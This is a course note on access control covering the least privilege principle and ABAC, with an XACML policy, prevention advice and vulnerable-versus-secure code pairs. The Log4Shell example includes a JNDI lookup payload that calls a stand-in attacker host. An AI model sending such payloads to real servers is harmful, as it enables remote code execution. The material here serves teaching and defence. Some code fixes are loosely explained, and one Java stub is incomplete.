---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Least Privilege Principle

### What is Least Privilege?

The principle of least privilege (PoLP) is a fundamental security concept that dictates that a user, program, or system process should operate using the minimum levels of access necessary to perform its task. This means that an entity should only have access to the resources it needs to accomplish its specific function and nothing more. In the context of web applications, this principle is crucial to minimizing the potential damage that can be caused by vulnerabilities or unauthorized access.

### Why is Least Privilege Important?

When a web application runs with elevated privileges such as system or root, it significantly increases the attack surface and the potential impact of a successful exploitation. If an attacker gains remote code execution (RCE) on an application running with high privileges, they can leverage those privileges to escalate their foothold within the network. This can lead to severe consequences, including data exfiltration, lateral movement, and even complete compromise of the infrastructure.

### How Does Least Privilege Work?

To implement least privilege, an application should be configured to run with a service account that has minimal permissions. This service account should only have the necessary rights to execute the application's functions and interact with required resources. For example, a web server might need read access to static files and write access to log files, but it should not have the ability to modify system configurations or execute arbitrary commands.

### Real-World Example: CVE-2021-44228 (Log4Shell)

One of the most notable recent examples of the importance of least privilege is the Log4Shell vulnerability (CVE-2021-44228). This vulnerability affected the Apache Log4j library, which is widely used in Java applications for logging purposes. An attacker could exploit this vulnerability to achieve RCE on the affected systems. If the application was running with elevated privileges, the attacker could potentially gain full control over the server and the network.

#### Full HTTP Request and Response Example

```http
POST /log HTTP/1.1
Host: vulnerable.example.com
Content-Type: application/json

{
  "message": "${jndi:ldap://attacker.example.com/a}"
}
```

```http
HTTP/1.1 200 OK
Date: Mon, 01 Jan 2024 00:00:00 GMT
Content-Type: text/plain

Logged successfully.
```

In this example, the attacker sends a crafted log message that triggers the Log4j vulnerability. If the application is running with elevated privileges, the attacker can execute arbitrary code on the server.

### How to Prevent / Defend Against Least Privilege Violations

#### Detection

- **Audit Logs**: Regularly review audit logs to identify any unauthorized access attempts or privilege escalations.
- **Security Tools**: Use tools like AppArmor, SELinux, or Docker security features to enforce least privilege at the operating system level.

#### Prevention

- **Service Accounts**: Configure the application to run with a dedicated service account that has the minimum necessary permissions.
- **Privilege Separation**: Ensure that different components of the application run with different levels of privilege, based on their functionality.

#### Secure Coding Fixes

**Vulnerable Code Example**

```python
import os
os.system("echo Hello World")
```

**Secure Code Example**

```python
import subprocess
subprocess.run(["echo", "Hello World"], check=True)
```

In the secure code example, `subprocess.run` is used instead of `os.system`, which avoids the risks associated with shell injection and ensures that the application runs with the least necessary privileges.

### Attribute-Based Access Control (ABAC)

### What is ABAC?

Attribute-based access control (ABAC) is a model for access control that uses attributes to determine whether a user is authorized to access a resource. Attributes can include user roles, resource types, time of day, location, and more. ABAC allows for fine-grained access control policies that can adapt to changing conditions and requirements.

### Why Use ABAC?

ABAC offers more flexibility and precision compared to traditional role-based access control (RBAC). With ABAC, access decisions can be made based on a combination of attributes, allowing for dynamic and context-aware access control. This can be particularly useful in complex environments where access needs to be tailored to specific scenarios.

### How Does ABAC Work?

In ABAC, access decisions are made by evaluating a set of policies defined in terms of attributes. These policies can be expressed in a policy language such as XACML (XML Access Control Markup Language). Policies are evaluated against the attributes of the subject (user), resource, and environment to determine whether access should be granted.

### Real-World Example: Healthcare Application

Consider a healthcare application where patient records need to be accessed by various stakeholders, including doctors, nurses, and administrative staff. Using ABAC, access can be controlled based on attributes such as the user's role, the patient's identity, and the type of record being accessed. For example, a doctor might be allowed to view a patient's medical history, but not financial information.

#### Policy Example

```xml
<PolicySet xmlns="urn:oasis:names:tc:xacml:3.0:core:schema:wd-17">
  <Target>
    <AnyOf>
      <AllOf>
        <Match MatchId="urn:oasis:names:tc:xacml:1.0:function:string-equal">
          <AttributeValue DataType="http://www.w3.org/2001/XMLSchema#string">doctor</AttributeValue>
          <AttributeDesignator AttributeId="subject-role" Category="urn:oasis:names:tc:xacml:1.0:subject-category:access-subject" DataType="http://www.w3.org/2001/XMLSchema#string" MustBePresent="true"/>
        </Match>
        <Match MatchId="urn:oasis:names:tc:xacml:1.0:function:string-equal">
          <AttributeValue DataType="http://www.w3.org/2001/XMLSchema#string">medical-history</AttributeValue>
          <AttributeDesignator AttributeId="resource-type" Category="urn:oasis:names:tc:xacml:3.0:attribute-category:resource" DataType="http://www.w3.org/2001/XMLSchema#string" MustBePresent="true"/>
        </Match>
      </AllOf>
    </AnyOf>
  </Target>
  <PolicySetDefaults>
    <DefaultDecision>Deny</DefaultDecision>
  </PolicySetDefaults>
  <Policy>
    <Rule Effect="Permit"/>
  </Policy>
</PolicySet>
```

This policy allows a user with the role "doctor" to access resources of type "medical-history".

### How to Prevent / Defend Against ABAC Misconfigurations

#### Detection

- **Policy Audits**: Regularly review and test access control policies to ensure they are correctly implemented and enforced.
- **Monitoring Tools**: Use monitoring tools to track access attempts and detect any unauthorized access patterns.

#### Prevention

- **Policy Management**: Implement a robust policy management framework to define, deploy, and maintain ABAC policies.
- **Training and Awareness**: Educate developers and administrators about the principles and best practices of ABAC.

#### Secure Coding Fixes

**Vulnerable Code Example**

```java
public boolean canAccessResource(User user, Resource resource) {
  return user.getRole().equals("admin");
}
```

**Secure Code Example**

```java
public boolean canAccessResource(User user, Resource resource) {
  return evaluateAbacPolicy(user, resource);
}

private boolean evaluateAbacPolicy(User user, Resource resource) {
  // Evaluate ABAC policy based on user attributes, resource attributes, and environment
  // Return true if access is permitted, false otherwise
}
```

In the secure code example, access decisions are made based on an ABAC policy evaluation rather than a simple role check.

### Practice Labs

For hands-on practice with access control vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on broken access control and privilege escalation.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills, including access control vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: Provides a range of web application vulnerabilities, including broken access control scenarios.

By thoroughly understanding and implementing the principles of least privilege and ABAC, you can significantly enhance the security posture of your web applications and reduce the risk of unauthorized access and privilege escalation attacks.

---
<!-- nav -->
[[16-Horizontal Privilege Escalation|Horizontal Privilege Escalation]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/01-Broken Access Control Complete Guide/00-Overview|Overview]] | [[18-Manipulating Metadata JSON Web Tokens and Cookies|Manipulating Metadata JSON Web Tokens and Cookies]]
